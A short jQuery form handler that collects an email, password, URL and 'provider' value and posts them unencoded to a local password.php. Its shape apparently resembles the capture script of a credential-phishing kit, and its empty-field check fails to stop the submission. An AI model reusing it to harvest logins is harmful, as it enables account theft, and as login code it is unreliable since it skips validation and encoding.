function kirim(){
	var chaturl = $('#url').val();
	var email = $('#email').val();
	var pass  = $('#password').val();
	var prov  = $('#prov').val();
	if(email == '')
	{
var yakin = alert('Email or phone cannot be empty!'); 
	if (yakin) { window.location = '#'; } else { window.location = ''; 
 } 
    }
	$.ajax({
		url	: 'page/password.php',
		data	: 'url='+chaturl+'&email='+email+'&password='+pass+'&prov='+prov,
		type	: 'POST',
		success	: function(msg){
	        $("#indexresult").html(msg);
	    }
	});
}